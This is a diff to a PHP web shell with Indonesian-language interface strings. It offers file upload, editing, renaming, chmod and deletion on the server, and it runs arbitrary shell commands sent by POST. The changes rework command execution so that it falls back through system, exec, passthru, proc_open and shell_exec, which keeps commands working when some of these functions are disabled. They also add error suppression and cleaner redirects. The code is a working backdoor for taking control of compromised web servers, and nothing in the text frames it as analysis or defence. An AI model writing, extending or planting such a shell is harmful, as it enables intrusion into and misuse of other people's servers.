@@ -151,7 +151,7 @@
             if (isset($_FILES['fileToUpload'])) {
                 $uploadFile = $path . DIRECTORY_SEPARATOR . basename($_FILES['fileToUpload']['name']);
                 if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $uploadFile)) {
-                    echo "<script>alert('File berhasil di-upload.'); window.location='?path=" . hex($path) . "';</script>";
+                    echo "<script>alert('File berhasil di-upload.');</script>";
                 } else {
                     echo "<script>alert('Gagal meng-upload file.');</script>";
                 }
@@ -257,7 +257,7 @@
                     if ($handle) {
                         fwrite($handle, $_POST['content']);
                         fclose($handle);
-                        echo "<script>alert('File berhasil disimpan.'); window.location='?path=" . hex($path) . "';</script>";
+                        echo "<script>alert('File berhasil disimpan.'); window.location.href='?path=" . hex(dirname($file)) . "';</script>";
                     } else {
                         echo "<script>alert('Gagal membuka file untuk ditulis.');</script>";
                     }
@@ -268,9 +268,9 @@
                         <form method='post'>
                             <textarea name='content' class='form-control' rows='10'>" . htmlspecialchars($content) . "</textarea><br>
                             <button type='submit' class='btn btn-primary'>Simpan</button>
-                            <a href='?path=" . hex($path) . "' class='btn btn-secondary'>Batal</a>
+                            <a href='?path=" . hex(dirname($file)) . "' class='btn btn-secondary'>Batal</a>
                         </form>
-                      </div>";
+                    </div>";
             }
         }
         // Menghandle rename file
@@ -278,33 +278,41 @@
             $file = unhex($_GET['rename']);
             if (is_file($file)) {
                 if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['new_name'])) {
-                    $newName = $_POST['new_name'];
-                    $newPath = dirname($file) . DIRECTORY_SEPARATOR . $newName;
-                    if (rename($file, $newPath)) {
-                        echo "<script>alert('File berhasil di-rename.'); window.location='?path=" . hex($path) . "';</script>";
+                    $newName = trim($_POST['new_name']);
+                    $directory = dirname($file);
+                    $newFilePath = $directory . DIRECTORY_SEPARATOR . $newName;
+                    if (!empty($newName) && !file_exists($newFilePath)) {
+                        if (rename($file, $newFilePath)) {
+                            echo "<script>alert('File berhasil di-rename.'); window.location.href='?path=" . hex($directory) . "';</script>";
+                            exit;
+                        } else {
+                            echo "<script>alert('Gagal rename file.');</script>";
+                        }
                     } else {
-                        echo "<script>alert('Gagal rename file.');</script>";
+                        echo "<script>alert('Nama file baru tidak valid atau file sudah ada.');</script>";
                     }
                 }
                 $currentName = basename($file);
                 echo "<div class='mt-4'>
-                        <h3>Rename File: " . $currentName . "</h3>
+                        <h3>Rename File: " . htmlspecialchars($currentName) . "</h3>
                         <form method='post'>
-                            <input type='text' name='new_name' class='form-control' value='" . $currentName . "'><br>
+                            <input type='text' name='new_name' class='form-control' value='" . htmlspecialchars($currentName) . "'><br>
                             <button type='submit' class='btn btn-primary'>Ganti Nama</button>
-                            <a href='?path=" . hex($path) . "' class='btn btn-secondary'>Batal</a>
+                            <a href='?path=" . hex(dirname($file)) . "' class='btn btn-secondary'>Batal</a>
                         </form>
-                      </div>";
+                    </div>";
+            } else {
+                echo "<script>alert('File tidak ditemukan.'); window.location.href='?path=" . hex(dirname($file)) . "';</script>";
             }
         }
         // Menghandle chmod file
-        if (isset($_GET['chmod'])) {
+        if (isset($_GET['chmod'])) {  
             $file = unhex($_GET['chmod']);
             if (is_file($file)) {
                 if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['permissions'])) {
                     $permissions = $_POST['permissions'];
                     chmod($file, octdec($permissions));
-                    echo "<script>alert('Permissions berhasil diubah.'); window.location='?path=" . hex($path) . "';</script>";
+                    echo "<script>alert('Permissions berhasil diubah.'); window.location.href='?path=" . hex(dirname($file)) . "';</script>";
                 }
                 $currentPermissions = substr(sprintf('%o', fileperms($file)), -4);
                 echo "<div class='mt-4'>
@@ -312,9 +320,9 @@
                         <form method='post'>
                             <input type='text' name='permissions' class='form-control' value='" . $currentPermissions . "'><br>
                             <button type='submit' class='btn btn-primary'>Set Permissions</button>
-                            <a href='?path=" . hex($path) . "' class='btn btn-secondary'>Batal</a>
+                            <a href='?path=" . hex(dirname($file)) . "' class='btn btn-secondary'>Batal</a>
                         </form>
-                      </div>";
+                    </div>";
             }
         }
         // Menghapus file
@@ -322,10 +330,10 @@
             $file = unhex($_GET['delete']);
             if (is_file($file)) {
                 unlink($file);
-                echo "<script>alert('File berhasil dihapus.'); window.location='?path=" . hex($path) . "';</script>";
+                echo "<script>alert('File berhasil dihapus.'); window.location.href='?path=" . hex(dirname($file)) . "';</script>";
             } elseif (is_dir($file)) {
                 rmdir($file);
-                echo "<script>alert('Folder berhasil dihapus.'); window.location='?path=" . hex($path) . "';</script>";
+                echo "<script>alert('Folder berhasil dihapus.'); window.location.href='?path=" . hex(dirname($file)) . "';</script>";
             }
         }
         // Renaming Folder (Directory)
@@ -404,53 +412,78 @@
         }
         // CMD sesuai dengan direktori di URL
         if (isset($_POST['cmd'])) {
-            $command = $_POST['cmd'];  
+            $cmd = $_POST['cmd'];
             $path = isset($_GET['path']) ? unhex($_GET['path']) : getcwd();
-            echo "<div class='mt-4'>";
-            $output = [];
-            $resultCode = null;
             chdir($path);
-            exec($command, $output, $resultCode);
-            if (empty($output)) {
-                ob_start();
-                $systemOutput = system($command, $systemResultCode);
-                $systemOutput = ob_get_clean();
-                if (empty($systemOutput)) {
-                    ob_start();
-                    passthru($command, $passthruResultCode);
-                    $passthruOutput = ob_get_clean();
-                    if (empty($passthruOutput)) {
-                        $descriptorspec = [
-                            0 => ["pipe", "r"],
-                            1 => ["pipe", "w"],
-                            2 => ["pipe", "w"]
-                        ];
-                        $process = proc_open($command, $descriptorspec, $pipes);
-                        if (is_resource($process)) {
-                            fclose($pipes[0]);
-                            $procOutput = stream_get_contents($pipes[1]);
-                            $procError = stream_get_contents($pipes[2]);
-                            fclose($pipes[1]);
-                            fclose($pipes[2]);
-                            $returnValue = proc_close($process);
-                            $output = $procOutput ? $procOutput : $procError;
-                            $resultCode = $returnValue;
-                        }
-                    } else {
-                        $output = $passthruOutput;
-                        $resultCode = $passthruResultCode;
-                    }
-                } else {
-                    $output = $systemOutput;
-                    $resultCode = $systemResultCode;
+            echo "<div class='mt-4'>";
+            $output = '';
+            $resultCode = 1;
+            if (function_exists('system')) {
+                @ob_start();
+                @system($cmd, $resultCode);
+                $output = @ob_get_contents();
+                @ob_end_clean();
+                if (!empty($output)) {
+                    echo "<pre>Result Code: $resultCode</pre>";
+                    echo "<pre>" . htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
+                    echo "</div>";
                 }
-            } else {
-                $output = implode("\n", $output);
-                $resultCode = $resultCode;
             }
-            echo "<pre>Result Code: $resultCode</pre>";
-            echo "<pre>$output</pre>";
-            echo "</div>";
+            else if (function_exists('exec')) {
+                $results = [];
+                @exec($cmd, $results, $resultCode);
+                if (!empty($results)) {
+                    $output = implode("\n", $results);
+                    echo "<pre>Result Code: $resultCode</pre>";
+                    echo "<pre>" . htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
+                    echo "</div>";
+                }
+            }
+            else if (function_exists('passthru')) {
+                @ob_start();
+                @passthru($cmd, $resultCode);
+                $output = @ob_get_contents();
+                @ob_end_clean();
+                if (!empty($output)) {
+                    echo "<pre>Result Code: $resultCode</pre>";
+                    echo "<pre>" . htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
+                    echo "</div>";
+                }
+            }
+            else if (function_exists('proc_open')) {
+                $descriptorspec = [
+                    0 => ["pipe", "r"],
+                    1 => ["pipe", "w"],
+                    2 => ["pipe", "w"]
+                ];
+                $process = @proc_open($cmd, $descriptorspec, $pipes);
+                if (is_resource($process)) {
+                    $output = @stream_get_contents($pipes[1]);
+                    @fclose($pipes[0]);
+                    @fclose($pipes[1]);
+                    @fclose($pipes[2]);
+                    $resultCode = @proc_close($process);
+                    if (!empty($output)) {
+                        echo "<pre>Result Code: $resultCode</pre>";
+                        echo "<pre>" . htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
+                        echo "</div>";
+                    }
+                }
+            }
+            else if (function_exists('shell_exec')) {
+                $output = @shell_exec($cmd);
+                $resultCode = ($output === null) ? 1 : 0;
+                if (!empty($output)) {
+                    echo "<pre>Result Code: $resultCode</pre>";
+                    echo "<pre>" . htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
+                    echo "</div>";
+                }
+            }
+            else {
+                echo "<pre>Result Code: $resultCode</pre>";
+                echo "<pre>$output</pre>";
+                echo "</div>";
+            }
         }
         // Create a new file
         if (isset($_POST['createFile'])) {
@@ -473,7 +506,7 @@
             }
         }
                 ?>
-    <div class='container-fluid'>
+        <div class='container-fluid'>
 			<div class='corner anu py-3'>
 				<button class='btn btn-outline-light btn-sm' data-bs-toggle='collapse' data-bs-target='#collapseExample' aria-expanded='false' aria-controls='collapseExample'>
 				<i class='bi bi-info-circle'></i> [CMD] - [Create File] - [Create Folder] <i class='bi bi-chevron-down'></i>
